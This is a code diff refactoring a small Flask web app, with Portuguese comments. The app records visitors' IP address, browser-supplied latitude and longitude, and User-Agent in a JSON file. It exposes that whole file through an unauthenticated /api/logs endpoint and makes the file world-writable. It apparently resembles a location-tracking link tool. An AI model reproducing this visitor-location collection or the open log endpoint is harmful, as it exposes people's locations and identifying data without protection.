@@ -5,103 +5,126 @@ import os
 
 app = Flask(__name__)
 
-ARQUIVO_LOG = 'logs.json'
+# Configurações robustas para o arquivo de logs
+LOG_DIR = os.path.join(os.getcwd(), 'logs')
+LOG_FILE = os.path.join(LOG_DIR, 'logs.json')
 
-def iniciar_arquivo_log():
-    """Cria o arquivo de logs se não existir"""
-    if not os.path.exists(ARQUIVO_LOG):
-        with open(ARQUIVO_LOG, 'w') as f:
-            json.dump([], f)
+def setup_log_system():
+    """Configura o sistema de logs com tratamento de erros"""
+    try:
+        # Cria o diretório se não existir
+        os.makedirs(LOG_DIR, exist_ok=True)
+        
+        # Cria o arquivo de logs se não existir
+        if not os.path.exists(LOG_FILE):
+            with open(LOG_FILE, 'w') as f:
+                json.dump([], f)
+            
+        # Verifica permissões de escrita
+        if not os.access(LOG_FILE, os.W_OK):
+            os.chmod(LOG_FILE, 0o666)
+            
+    except Exception as e:
+        print(f"ERRO NA CONFIGURAÇÃO: {str(e)}")
+        raise
 
-def obter_ip_real():
-    """Obtém o IP real do cliente, mesmo atrás de proxy"""
-    # Verifica o cabeçalho X-Forwarded-For (comum em proxies como Render)
-    if 'X-Forwarded-For' in request.headers:
-        ips = request.headers['X-Forwarded-For'].split(',')
-        return ips[0].strip()  # O primeiro IP é o cliente real
+def get_client_ip():
+    """Obtém o IP real do cliente mesmo com proxy"""
+    for header in ('X-Forwarded-For', 'X-Real-IP'):
+        if header in request.headers:
+            return request.headers[header].split(',')[0].strip()
     return request.remote_addr
 
-def salvar_log(ip, latitude=None, longitude=None):
-    """Salva uma nova entrada de log com tratamento de erros"""
-    entrada = {
-        "data_hora": datetime.now().isoformat(),
-        "ip": ip,
-        "latitude": latitude,
-        "longitude": longitude,
-        "navegador": request.headers.get('User-Agent', 'Desconhecido'),
-        "metodo": request.method,
-        "endpoint": request.path
-    }
-
+def save_to_log(ip, lat, lng):
+    """Salva dados no log com tratamento robusto"""
     try:
-        # Ler logs existentes
+        # Lê logs existentes
         logs = []
-        if os.path.exists(ARQUIVO_LOG):
+        if os.path.exists(LOG_FILE):
             try:
-                with open(ARQUIVO_LOG, 'r') as f:
+                with open(LOG_FILE, 'r') as f:
                     logs = json.load(f)
-                    if not isinstance(logs, list):
-                        logs = []
-            except (json.JSONDecodeError, IOError):
+            except (json.JSONDecodeError, IOError) as e:
+                print(f"ERRO AO LER LOG: {str(e)}")
                 logs = []
 
-        # Adicionar nova entrada
-        logs.append(entrada)
+        # Adiciona novo registro
+        new_entry = {
+            "ip": ip,
+            "latitude": float(lat),
+            "longitude": float(lng),
+            "timestamp": datetime.now().isoformat(),
+            "user_agent": request.headers.get('User-Agent', ''),
+            "success": True
+        }
+        logs.append(new_entry)
 
-        # Salvar no arquivo
-        with open(ARQUIVO_LOG, 'w') as f:
+        # Escreve no arquivo
+        with open(LOG_FILE, 'w') as f:
             json.dump(logs, f, indent=2)
             
         return True
     except Exception as e:
-        print(f"Falha ao salvar log: {str(e)}")
+        print(f"ERRO AO SALVAR: {str(e)}")
         return False
 
 @app.route('/')
-def inicio():
+def home():
     return render_template('index.html')
 
 @app.route('/conteudo')
-def conteudo():
+def content():
     return render_template('conteudo.html')
 
-@app.route('/localizacao', methods=['POST'])
-def receber_localizacao():
+@app.route('/api/location', methods=['POST'])
+def handle_location():
     try:
-        dados = request.get_json()
-        if not dados:
-            return jsonify({"erro": "Nenhum dado fornecido"}), 400
+        data = request.get_json()
+        if not data:
+            return jsonify({
+                "status": "error",
+                "message": "Dados não recebidos"
+            }), 400
 
-        ip = obter_ip_real()
-        latitude = dados.get('latitude')
-        longitude = dados.get('longitude')
+        ip = get_client_ip()
+        lat = data.get('latitude')
+        lng = data.get('longitude')
 
-        if not all([latitude, longitude]):
-            return jsonify({"erro": "Dados de localização incompletos"}), 400
+        if None in (lat, lng):
+            return jsonify({
+                "status": "error",
+                "message": "Latitude ou longitude faltando"
+            }), 400
 
-        if salvar_log(ip, latitude, longitude):
-            return jsonify({"status": "sucesso"})
+        if save_to_log(ip, lat, lng):
+            return jsonify({"status": "success"})
         else:
-            return jsonify({"erro": "Falha ao salvar localização"}), 500
+            return jsonify({
+                "status": "error",
+                "message": "Falha ao salvar no servidor"
+            }), 500
 
     except Exception as e:
-        return jsonify({"erro": str(e)}), 500
+        return jsonify({
+            "status": "error",
+            "message": f"Erro interno: {str(e)}"
+        }), 500
 
-@app.route('/logs', methods=['GET'])
-def visualizar_logs():
+@app.route('/api/logs', methods=['GET'])
+def get_logs():
     try:
-        if not os.path.exists(ARQUIVO_LOG):
-            return jsonify({"erro": "Nenhum log disponível"}), 404
+        if not os.path.exists(LOG_FILE):
+            return jsonify({"logs": []})
 
-        with open(ARQUIVO_LOG, 'r') as f:
-            logs = json.load(f)
-            return jsonify(logs)
-    except json.JSONDecodeError:
-        return jsonify({"erro": "Arquivo de log corrompido"}), 500
+        with open(LOG_FILE, 'r') as f:
+            return jsonify({"logs": json.load(f)})
     except Exception as e:
-        return jsonify({"erro": str(e)}), 500
+        return jsonify({
+            "status": "error",
+            "message": f"Erro ao ler logs: {str(e)}"
+        }), 500
 
 if __name__ == '__main__':
-    iniciar_arquivo_log()  # Garante que o arquivo de log existe
-    porta = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=porta)
+    setup_log_system()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
